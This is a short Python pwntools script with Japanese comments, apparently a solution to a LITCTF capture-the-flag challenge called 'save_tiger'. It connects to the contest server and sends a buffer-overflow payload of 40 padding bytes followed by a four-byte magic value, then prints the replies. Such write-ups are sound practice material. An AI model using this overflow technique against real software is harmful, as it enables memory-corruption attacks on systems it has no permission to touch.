from pwn import *

#テスト
#p=process("./save_tiger")

#接続先
p=remote("litctf.live", 31786)

#送信内容
p.sendline("A"*40+"\xab\xaa\xad\xab")

#出力表示(一回に一行しか表示されないので連打してます)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())